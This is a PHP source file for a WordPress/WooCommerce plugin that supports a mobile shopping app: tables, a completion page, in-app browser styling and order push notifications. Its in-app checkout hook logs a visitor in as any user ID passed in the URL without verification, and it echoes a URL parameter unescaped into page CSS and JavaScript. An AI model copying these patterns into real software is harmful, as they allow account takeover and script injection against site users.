<?php

// ON Activating plugin
//setup database
if (!function_exists('skye_activated')) {
    function skye_activated()
    {
        set_transient('skye-api-activated', true, 5);

        // setup database
        global $wpdb;
        $charset_collate = $wpdb->get_charset_collate();
        $cart_table = $wpdb->prefix . "skye_carts";
        $banners_table = $wpdb->prefix . "skye_app_banners";

        require_once(ABSPATH . '/wp-admin/includes/upgrade.php');
        $sql = "CREATE TABLE IF NOT EXISTS " . $cart_table . " (
                ID INT NOT NULL AUTO_INCREMENT,
                user VARCHAR(2000),
                cart_value LONGTEXT,
                session_expiry DATETIME,
                PRIMARY KEY (ID)
            ) " . $charset_collate . ";";
        dbDelta($sql);

        //database for banners
        $sql = "CREATE TABLE IF NOT EXISTS " . $banners_table . " (
                ID INT NOT NULL AUTO_INCREMENT,
                image INT,
                banner_type VARCHAR(1000) DEFAULT 'slide',
                title VARCHAR(2000),
                description VARCHAR(2000),
                on_click_to VARCHAR(1000),
                category VARCHAR(1000),
                url VARCHAR(2000),
                PRIMARY KEY (ID)
            ) " . $charset_collate . ";";
        dbDelta($sql);

        //FOR PRVIOUS INSTALLATION THAT HAS NO banner_type COLUMN
        $row = $wpdb->get_results("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = '$banners_table' AND column_name = 'banner_type'");  
        
        if(empty($row)){  
            $wpdb->query("ALTER TABLE $banners_table ADD banner_type VARCHAR(1000) DEFAULT 'slide'");
        } 


        //PAGE FOR ORDER COMPLETION
        $page_name = "app-complete-order";
        if ($page = get_page_by_path($page_name)) {
            update_post_meta($page->ID, '_wp_page_template', 'app-complete-order.php');
            update_metadata('page', $page->ID, '_wp_page_template', 'app-complete-order.php.php');
        } else {
            $page_args = array(
                'post_title' => 'Complete Order',
                'post_name' => $page_name,
                'post_content' => '',
                'post_status' => 'publish',
                'post_author' => 1,
                'post_type' => 'page'
            );
            $page_id = wp_insert_post($page_args);
            update_post_meta($page_id, '_wp_page_template', 'app-complete-order.php');
            update_metadata('page', $page_id, '_wp_page_template', 'app-complete-order.php');
        }
    }
}
//welcome message
add_action('admin_notices', function () {
    if (get_transient('skye-api-activated')) { ?>
        <div class="updated notice is-dismissible">
            <p>Thank you for using Skye App API... You are on your way creating your <strong>awesome apps</strong>.</p>
        </div>
        <?php
        //to only display this once
        delete_transient('skye-api-activated');
    }
});

include(plugin_dir_path(__FILE__) . 'admin.php');



// FOR GIVEPHUCK WEBSITE - REMOVE THIS LATER please
// add_action( 'show_user_profile', 'extra_user_profile_fields' );
// add_action( 'edit_user_profile', 'extra_user_profile_fields' );

//function extra_user_profile_fields( $user ) { ? >
// <!-- <h3><?php //_e("Tron Wallet", "blank"); ? ></h3> -->

//     <!-- <table class="form-table">
//     <tr>
//         <th><label for="tron-wallet"><?php //_e("Tron Wallet Address"); ? ></label></th>
//         <td>
//             <input type="text" name="tron-wallet" id="tron-wallet" value="<?php //echo esc_attr( get_the_author_meta( 'tron_wallet', $user->ID ) ); ? >" class="regular-text" /><br />
//             <span class="description">< ?php //_e("Please enter your tron wallet address."); ? ></span>
//         </td>
//     </tr>
//     </table> -->
// <?php // }
// add_action( 'personal_options_update', 'save_extra_user_profile_fields' );
// add_action( 'edit_user_profile_update', 'save_extra_user_profile_fields' );

// function save_extra_user_profile_fields( $user_id ) {
//     if ( empty( $_POST['_wpnonce'] ) || ! wp_verify_nonce( $_POST['_wpnonce'], 'update-user_' . $user_id ) ) {
//         return;
//     }

//     update_user_meta( $user_id, 'tron_wallet', $_POST['tron-wallet'] );
// }
// END OF - FOR GIVEVPHUCK WEBSITE 

function skye_update_custom_roles()
{
    if (get_option('skye_driver_roles_version') < 1) {
        add_role('skye_delivery_driver', 'Skye Delivery Driver', array('read' => true, 'level_0' => true));
        update_option('skye_driver_roles_version', 1);
    }
}
add_action('init', 'skye_update_custom_roles');


// FOR WEB PAYMENT and BROWSER
add_action('init', function () {

    //for general browser
    if (isset($_GET['in_sk_app'])) {
        setcookie("SK_IN_APP", "1", time() + (86400 * 360), "/"); // 86400 = 1 day
        if (!session_id()) {
            session_start();
        }
        $_SESSION["SK_IN_APP"] = "1";

        //to hide some elements
        if (isset($_GET['hide_elements'])) {
            $elements = str_replace("*", "#", $_GET['hide_elements']);
            setcookie("HIDE_ELEMENTS", $elements, time() + (86400 * 360), "/"); // 86400 = 1 day
            if (!session_id()) {
                session_start();
            }
            $_SESSION["HIDE_ELEMENTS"] = $elements;
        }
    }

    //for payment with user id
    if (isset($_GET["sk-user-checkout"]) && isset($_GET['sk-web-payment'])) {
        $user_id = $_GET["sk-user-checkout"];
        if (sk_user_exists($user_id)) {
            if (!is_user_logged_in() && get_current_user_id() != $user_id) {
                $user = get_user_by('ID', $user_id);
                clean_user_cache($user->ID);
                wp_clear_auth_cookie();
                wp_set_current_user($user_id, $user->user_login);
                wp_set_auth_cookie($user_id, true);
                do_action('wp_login', $user->user_login, $user);
                setcookie("SK_IN_APP", "1", time() + (86400 * 360), "/"); // 86400 = 1 day
                if (!session_id()) {
                    session_start();
                }
                $_SESSION["SK_IN_APP"] = "1";

                //to hide some elements
                if (isset($_GET['hide_elements'])) {
                    $elements = str_replace("*", "#", $_GET['hide_elements']);
                    setcookie("HIDE_ELEMENTS", $elements, time() + (86400 * 360), "/"); // 86400 = 1 day
                    if (!session_id()) {
                        session_start();
                    }
                    $_SESSION["HIDE_ELEMENTS"] = $elements;
                }

                // clear cart in the browser first
                // WC()->cart->empty_cart();
        ?>
                <script>
                    document.location.reload(true);
                </script>
        <?php
            }
        }
    }
});

//script to remove header, sidebar and footer from PAYMENT page AND BROWSER
add_action('wp_enqueue_scripts', 'ava_test_init');
function ava_test_init()
{
    if ((isset($_GET["sk-user-checkout"]) && isset($_GET["pay_for_order"])) || in_sk_app() || isset($_GET['in_sk_app'])) {
        wp_enqueue_style('slider', plugin_dir_url(__FILE__) . 'in-app-style.css', false, '1.1', 'all');
        wp_enqueue_script('sk-js', plugins_url('/in-app-script.js', __FILE__));
    }
}

//for in app browser css
add_action('wp_head', function () {
    if ((isset($_GET["sk-user-checkout"]) && isset($_GET["pay_for_order"])) || in_sk_app() || isset($_GET['in_sk_app'])) {
    ?>
        <style>
            header,
            #masthead,
            div.storefront-breadcrumb,
            footer,
            aside,
            div.storefront-handheld-footer-bar,
            #glt-translate-trigger, .mailchimp-newsletter {
                display: none;
            }
            /* FOR CUSTOM elements to hide, for #id use *id */
            <?php 
            if (isset($_GET['hide_elements'])) {
                $elements = str_replace("*", "#", $_GET['hide_elements']);
                echo $elements . " {";
                echo "display: none;";
                echo "}";
            } elseif (isset($_COOKIE['HIDE_ELEMENTS'])) {
                $elements = str_replace("*", "#", $_COOKIE['HIDE_ELEMENTS']);
                echo $elements . " {";
                echo "display: none;";
                echo "}";
            }

            ?>

        </style>
    <?php
    }
});
//for in app browser javascript
add_action('wp_footer', function () {
    if ((isset($_GET["sk-user-checkout"]) && isset($_GET["pay_for_order"])) || in_sk_app() || isset($_GET['in_sk_app'])) {
        ?>
            <script>
              jQuery(document).ready(function ($) {
                    $('header, #masthead').hide();
                    $('div.storefront-breadcrumb').hide();
                    $("footer").hide();
                    $("aside").hide();
                    $("nav.woocommerce-breadcrumb").hide();
                    $("div.storefront-handheld-footer-bar").hide();
                    $("#glt-translate-trigger, .mailchimp-newsletter, div.bannerContent").hide();

                    $("div.fb_dialog_content iframe").remove();
                    $("script.yoast-schema-graph").remove();
					$("a.cd-top.progress-wrap.active-progress, a.cd-top.progress-wrap").hide();
					$("a.cd-top.progress-wrap.active-progress, a.cd-top.progress-wrap").remove();
					$("div.fb_iframe_widget, div.fb_iframe_widget .iframe, html#facebook, div.fb_dialog_content, div.#fb-root").hide();
					$("div.fb_iframe_widget, div.fb_iframe_widget .iframe, html#facebook, div.fb_dialog_content, div.#fb-root").remove();
                        

                    /* FOR CUSTOM elements to hide, for #id use *id */
                    <?php if (isset($_GET['hide_elements'])) { $elements = str_replace("*", "#", $_GET['hide_elements']);
                         ?>
                        $("<?php echo $elements; ?>").hide();
                    <?php } elseif (isset($_SESSION['HIDE_ELEMENTS'])) { $elements = str_replace("*", "#", $_SESSION['HIDE_ELEMENTS']);
                         ?>
                        $("<?php echo $elements; ?>").hide();
                    <?php } ?> 

                    setInterval(() => {
                        $("div.storefront-handheld-footer-bar").hide();
                        $("#glt-translate-trigger").hide();
                        /* FOR CUSTOM elements to hide, for #id use *id */
                    <?php if (isset($_GET['hide_elements'])) { $elements = str_replace("*", "#", $_GET['hide_elements']);
                         ?>
                        $("<?php echo $elements; ?>").hide();
                    <?php } elseif (isset($_SESSION['HIDE_ELEMENTS'])) { $elements = str_replace("*", "#", $_SESSION['HIDE_ELEMENTS']);
                         ?>
                        $("<?php echo $elements; ?>").hide();
                    <?php } ?> 

                    }, 1000);
                    
                });
            </script>
        <?php
        }
});

//ORDER COMPLETING PAGE
add_filter('page_template', function ($template) {
    if (is_page_template('app-complete-order.php') || is_page('app-complete-order'))
        $template = plugin_dir_path(__FILE__) . 'pages/app-complete-order.php';

    return $template;
});


// CUSTOM FIELD FOR ICON UPLOAD FOR CATEGORIES
function sk_category_icon_fields($tag) { 
        $cat_id = $tag->term_id;
        // $cat_meta = get_option( "product_cat_{$cat_id}_icon");
        $cat_meta = get_term_meta( $cat_id, 'product_cat_icon', true );

        $icon_paceholder = plugin_dir_url(__DIR__) . "assets/woocommerce-placeholder-324x324.png";
        $cat_icon_url = $icon_paceholder;
        if ($cat_meta) {
            $cat_icon = wp_get_attachment_image_src($cat_meta, null);
            if ($cat_icon) {
                $cat_icon_url = $cat_icon[0];
            }
        }
    ?>
    <tr class="form-field">
        <th scope="row" valign="top"><label for="sk_category_icon"><?php _e('App Icon'); ?></label></th>
        <td>
				<div id="product_cat_icon" style="float: left; margin-right: 10px;"><img src="<?php echo $cat_icon_url; ?>" width="60px" height="60px"></div>
				<div style="line-height: 60px;">
					<input type="hidden" id="product_cat_icon_id" name="product_cat_icon_id" value="<?php echo ($cat_meta) ? $cat_meta : 0; ?>">
					<button type="button" class="upload_icon_button button">Upload/Add image</button>
					<button type="button" class="remove_icon_button button" style="display: none;">Remove image</button>
				</div>
				<script type="text/javascript">

					// Only show the "remove icon" button when needed
					if ( '0' === jQuery( '#product_cat_icon_id' ).val() ) {
						jQuery( '.remove_icon_button' ).hide();
					}

					// Uploading files
					var sk_file_frame;

					jQuery( document ).on( 'click', '.upload_icon_button', function( event ) {

						event.preventDefault();

						// If the media frame already exists, reopen it.
						if ( sk_file_frame ) {
							sk_file_frame.open();
							return;
						}

						// Create the media frame.
						sk_file_frame = wp.media.frames.downloadable_file = wp.media({
							title: 'Choose an image',
							button: {
								text: 'Use image'
							},
							multiple: false
						});

						// When an image is selected, run a callback.
						sk_file_frame.on( 'select', function() {
							var attachment           = sk_file_frame.state().get( 'selection' ).first().toJSON();
							var attachment_thumbnail = attachment.sizes.thumbnail || attachment.sizes.full;

							jQuery( '#product_cat_icon_id' ).val( attachment.id );
							jQuery( '#product_cat_icon' ).find( 'img' ).attr( 'src', attachment_thumbnail.url );
							jQuery( '.remove_icon_button' ).show();
						});

						// Finally, open the modal.
						sk_file_frame.open();
					});

					jQuery( document ).on( 'click', '.remove_icon_button', function() {
						jQuery( '#product_cat_icon' ).find( 'img' ).attr( 'src', '<?php echo $icon_paceholder; ?>' );
						jQuery( '#product_cat_icon_id' ).val( '0' );
						jQuery( '.remove_icon_button' ).hide();
						return false;
					});

				</script>
				<div class="clear"></div>
			</td>
    </tr>
<?php }
add_action('product_cat_edit_form_fields', 'sk_category_icon_fields');

//SAVE
// save extra category extra fields hook
function sk_save_category_icon_fileds( $term_id ) {
    if ( isset( $_POST['product_cat_icon_id'] ) ) {
        // update_option( "product_cat_{$term_id}_icon", $_POST['product_cat_icon_id']);
        update_term_meta($term_id,  'product_cat_icon',  $_POST['product_cat_icon_id']);
    }
}
add_action ( 'created_product_cat', 'sk_save_category_icon_fileds' );
add_action ( 'edited_product_cat', 'sk_save_category_icon_fileds' );





add_action('woocommerce_thankyou', 'sk_app_thankyou', 10, 1);
function sk_app_thankyou(){ if (in_sk_app()) {  ?>
	<script>
        (function() {
            SkyeApp.orderPlaced();
        })();
    </script>
    <!-- must be seperated because the android method may raise error for iOS  -->
    <script>
        (function() {
            webkit.messageHandlers.skyeHandler.postMessage("any");
        })();
    </script>
<?php } }


//PUSH NOTIFICATION
add_action( 'woocommerce_order_status_completed', function($order_id) {
    //push notification
    $order = wc_get_order( $order_id );
    $device = get_user_meta( $order->get_user_id(), 'sk_device_id');
    if ($device) {
        sk_push_notification($device, array(
            'title'=>'Order Completed', 
            'body'=>'Your Order #' . $order->get_id() . ' has been marked completed.'
        ));
    }
}, 10, 1 );

add_action( 'woocommerce_order_status_pending', function($order_id) {
    //push notification
    $order = wc_get_order( $order_id );
    $device = get_user_meta( $order->get_user_id(), 'sk_device_id');
    if ($device) {
        sk_push_notification($device, array(
            'title'=>'Order Pending', 
            'body'=>'Your Order #' . $order->get_id() . ' has been marked pending payment.'
        ));
    }
}, 10, 1 );

add_action( 'woocommerce_order_status_failed', function($order_id) {
    //push notification
    $order = wc_get_order( $order_id );
    $device = get_user_meta( $order->get_user_id(), 'sk_device_id');
    if ($device) {
        sk_push_notification($device, array(
            'title'=>'Order Failed', 
            'body'=>'Your Order #' . $order->get_id() . ' has been marked failed.'
        ));
    }
}, 10, 1 );

add_action( 'woocommerce_order_status_on-hold', function($order_id) {
    //push notification
    $order = wc_get_order( $order_id );
    $device = get_user_meta( $order->get_user_id(), 'sk_device_id');
    if ($device) {
        sk_push_notification($device, array(
            'title'=>'Order On Hold', 
            'body'=>'Your Order #' . $order->get_id() . ' has been marked on-hold.'
        ));
    }
}, 10, 1 );

add_action( 'woocommerce_order_status_processing', function($order_id) {
    //push notification
    $order = wc_get_order( $order_id );
    $device = get_user_meta( $order->get_user_id(), 'sk_device_id');
    if ($device) {
        sk_push_notification($device, array(
            'title'=>'Order Processing', 
            'body'=>'Your Order #' . $order->get_id() . ' has been marked processing.'
        ));
    }
}, 10, 1 );

add_action( 'woocommerce_order_status_refunded', function($order_id) {
    //push notification
    $order = wc_get_order( $order_id );
    $device = get_user_meta( $order->get_user_id(), 'sk_device_id');
    if ($device) {
        sk_push_notification($device, array(
            'title'=>'Order Refunded', 
            'body'=>'Your Order #' . $order->get_id() . ' has been marked refunded.'
        ));
    }
}, 10, 1 );

add_action( 'woocommerce_order_status_cancelled', function($order_id) {
    //push notification
    $order = wc_get_order( $order_id );
    $device = get_user_meta( $order->get_user_id(), 'sk_device_id');
    if ($device) {
        sk_push_notification($device, array(
            'title'=>'Order Cancelled', 
            'body'=>'Your Order #' . $order->get_id() . ' has been marked cancelled.'
        ));
    }
}, 10, 1 );
//END OF PUSH NOTIFICATION



//CUSTOM USER PROFILE FIELD
include(plugin_dir_path(__FILE__) . 'hooks/custom-user-profile-field.php');
//END CUSTOM USER PROFILE FIELD




